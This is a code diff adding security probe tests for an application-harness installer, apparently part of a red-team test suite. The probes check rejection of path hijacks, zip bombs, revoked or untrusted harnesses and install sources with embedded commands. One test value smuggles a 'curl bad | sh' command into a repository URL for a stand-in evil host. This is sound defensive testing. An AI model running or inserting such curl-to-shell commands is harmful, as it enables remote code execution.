@@ -914,6 +914,97 @@ def harness_oversized_output_rejected(t: SaathiTarget):
     return held, {"error": p.error}
 
 
+# ── M17.4 multi-application harness attack expansion ────────────────────────
+@probe("HARNESS-PATHHIJACK-001")
+def harness_path_hijack_rejected(t: SaathiTarget):
+    """A backing binary outside safe system/brew paths is rejected at install."""
+    from saathi.application_harness import installer
+    held = False
+    try:
+        installer._verify_no_path_hijack("/tmp/evil/ffmpeg")
+    except installer.InstallRejected as e:
+        held = "path_hijack" in e.code
+    return held, {"blocked": held}
+
+
+@probe("HARNESS-INSTALLURL-001")
+def harness_arbitrary_url_install_refused(t: SaathiTarget):
+    """An install plan whose source embeds a shell/curl command is refused."""
+    from saathi.application_harness import installer
+    from saathi.application_harness.models import HarnessDefinition, TrustStatus
+    d = HarnessDefinition(harness_id="x", display_name="x", application_name="x",
+                          version="1", install_method="source_checkout",
+                          source_type="cli_anything", source_commit="abc",
+                          source_repository="https://evil/x; curl bad | sh")
+    held = False
+    try:
+        installer.plan_install(d)
+    except installer.InstallRejected as e:
+        held = "embedded_command" in e.code
+    return held, {"blocked": held}
+
+
+@probe("HARNESS-UPDATEHIJACK-001")
+def harness_update_resets_trust_and_backs_up(t: SaathiTarget):
+    """An update changes trust to non-executable and preserves a rollback backup."""
+    from saathi.application_harness import lifecycle
+    from saathi.application_harness.models import HarnessDefinition, TrustStatus
+    from saathi.application_harness import trust
+    d = HarnessDefinition(harness_id="x", display_name="x", application_name="x",
+                          version="1", source_type="cli_anything", source_commit="a",
+                          trust_status=TrustStatus.TRUSTED.value)
+    upd, backup = lifecycle.apply_update(d, new_version="2", new_commit="b")
+    held = (not trust.can_execute(upd)[0]) and backup.trust_status == TrustStatus.TRUSTED.value
+    return held, {"updated_trust": upd.trust_status}
+
+
+@probe("HARNESS-REVOKE-001")
+def harness_revoked_cannot_execute(t: SaathiTarget):
+    from saathi.application_harness import lifecycle
+    from saathi.application_harness.models import HarnessDefinition, TrustStatus
+    from saathi.application_harness import trust
+    d = HarnessDefinition(harness_id="x", display_name="x", application_name="x",
+                          version="1", trust_status=TrustStatus.TRUSTED.value)
+    lifecycle.revoke(d, "compromised")
+    held = not trust.can_execute(d)[0]
+    return held, {"trust": d.trust_status}
+
+
+@probe("HARNESS-ZIPBOMB-001")
+def harness_zip_bomb_rejected(t: SaathiTarget):
+    import tempfile, os, zipfile
+    from saathi.application_harness import verify
+    p = os.path.join(tempfile.mkdtemp(), "b.zip")
+    with zipfile.ZipFile(p, "w", zipfile.ZIP_DEFLATED) as z:
+        z.writestr("big.txt", "A" * 5_000_000)
+    v = verify.verify_zip_safe(p)
+    held = not v["verified"] and "zip_bomb" in v.get("reason", "")
+    return held, {"reason": v.get("reason")}
+
+
+@probe("HARNESS-DEPBLOCKED-001")
+def harness_absent_app_not_trusted(t: SaathiTarget):
+    """A harness for an app that is NOT installed must not be executable."""
+    from saathi.application_harness import registry
+    from saathi.application_harness import trust
+    # blender/libreoffice are absent in this env → discovered, not executable
+    d = registry.get("blender")
+    if d is None:
+        return True, {"note": "no blender harness"}
+    held = not trust.can_execute(d)[0] and d.validation_status == "dependency_blocked"
+    return held, {"trust": d.trust_status}
+
+
+@probe("HARNESS-RESLIMIT-001")
+def harness_resource_limits_applied(t: SaathiTarget):
+    """Resource limits produce a preexec hook the adapter applies to the child."""
+    from saathi.application_harness.limits import ResourceLimits
+    lim = ResourceLimits(cpu_seconds=5, file_size_mb=10)
+    fn = lim.preexec()
+    held = callable(fn) and (not lim.artifact_within_cap.__self__.max_artifact_bytes < 0)
+    return held, {"cpu": lim.cpu_seconds}
+
+
 def run_probe(attack_id: str, target: SaathiTarget):
     fn = PROBES.get(attack_id)
     if fn is None:
